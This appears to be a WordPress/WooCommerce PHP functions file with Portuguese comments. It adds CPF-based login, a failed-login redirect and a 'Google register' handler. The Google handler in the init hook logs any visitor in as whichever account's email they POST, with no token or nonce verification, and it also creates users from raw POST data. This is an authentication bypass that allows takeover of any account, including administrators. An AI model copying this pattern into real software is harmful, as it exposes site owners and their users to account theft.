<?php
//Redicreciona após erro no login
add_action('wp_login_failed', 'my_front_end_login_fail'); // hook failed login
function my_front_end_login_fail($username)
{
  $referrer = $_SERVER['HTTP_REFERER'];

  // Verifica se o referrer é válido e não é a tela padrão de login/admin
  if (
    !empty($referrer) &&
    !strstr($referrer, 'wp-login') &&
    !strstr($referrer, 'wp-admin')
  ) {
    // Verifica se o parâmetro 'login=failed' já está presente
    if (strpos($referrer, 'login=failed') === false) {
      // Decide se deve usar ? ou & dependendo da presença de outros parâmetros
      $separator = parse_url($referrer, PHP_URL_QUERY) ? '&' : '?';
      wp_redirect($referrer . $separator . 'login=failed');
      exit();
    } else {
      // Se já contém 'login=failed', redireciona sem modificar
      wp_redirect($referrer);
      exit();
    }
  }
}

// Limpe o username no login se for CPF
function formata_username($username)
{
  if (!str_contains($username, '@')) {
    $username = str_replace('.', '', $username);
    $username = str_replace('-', '', $username);
  }
  return $username;
}
add_filter('sanitize_user', 'formata_username');

//Autenticação customizada com CPF
add_filter('authenticate', 'custom_authenticate', 10, 3);
function custom_authenticate($user, $username, $password)
{
  if (!empty($username) && !empty($password)) {
    if (!str_contains($username, '@')) {
      // Login com CPF
      $username = str_replace(['.', '-'], '', $username);

      $users = get_users([
        'meta_key' => 'cpf',
        'meta_value' => $username,
        'number' => 1 // só precisa de um
      ]);

      if (!empty($users)) {
        $found_user = $users[0];
        $target_user_email = $found_user->user_email;

        // Passa null como primeiro parâmetro
        return wp_authenticate_username_password(
          null,
          $target_user_email,
          $password
        );
      }
    }
  }

  // Processa o login normalmente
  return wp_authenticate_username_password(null, $username, $password);
}

add_filter('gettext', 'username_login_form_label', 10, 3);
add_filter('ngettext', 'username_login_form_label', 10, 3);
function username_login_form_label($translated, $text, $domain)
{
  if (
    str_starts_with($text, 'Username or email address') &&
    $domain === 'woocommerce'
  ) {
    // Replacement text (where "%s" is the dynamic product name)
    $translated = __('CPF ou e-mail', $domain);
  }
  return $translated;
}

add_action('init', 'verificar_usuario_logado');
function verificar_usuario_logado()
{
  if (is_user_logged_in()) {
    $user = wp_get_current_user();
    $_cpf = get_user_meta($user->ID, 'cpf', true);
    $_username = $user->user_login;
    if ($_cpf === '') {
      if (!str_contains($_username, '@')) {
        update_user_meta($user->ID, 'cpf', $_username);
      }
    }
  }

  if (isset($_POST['register_method'])) {
    if ($_POST['register_method'] === '_google_register') {
      $email = $_POST['email'];
      $user = get_user_by('email', $email);
      if ($user) {
        // Usuário já existe, faça login
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        wp_redirect(home_url() . '/minha-conta');
        exit();
      } else {
        // Usuário não existe, registrar

        // Dados do novo usuário
        $_pass = wp_generate_password();
        $user_data = [
          'user_login' => $_POST['username'],
          'first_name' => $_POST['billing_first_name'],
          'last_name' => $_POST['billing_last_name'],
          'display_name' => $_POST['billing_first_name'],
          'user_pass' => wp_generate_password(), // Gera uma senha aleatória
          'user_email' => $_POST['email'],
          'user_nicename' => $_POST['billing_first_name'],
          'role' => 'subscriber' // Defina a função de usuário desejada
        ];

        // Insira o novo usuário
        $registered_user_id = wp_insert_user($user_data);
        update_user_meta(
          $registered_user_id,
          'billing_first_name',
          sanitize_text_field($_POST['billing_first_name'])
        );
        update_user_meta(
          $registered_user_id,
          'billing_last_name',
          sanitize_text_field($_POST['billing_last_name'])
        );
        wp_set_current_user($registered_user_id);
        wp_set_auth_cookie($registered_user_id);
        wp_redirect(home_url() . '/minha-conta');
        exit();
      }
    }
  }
}

?>
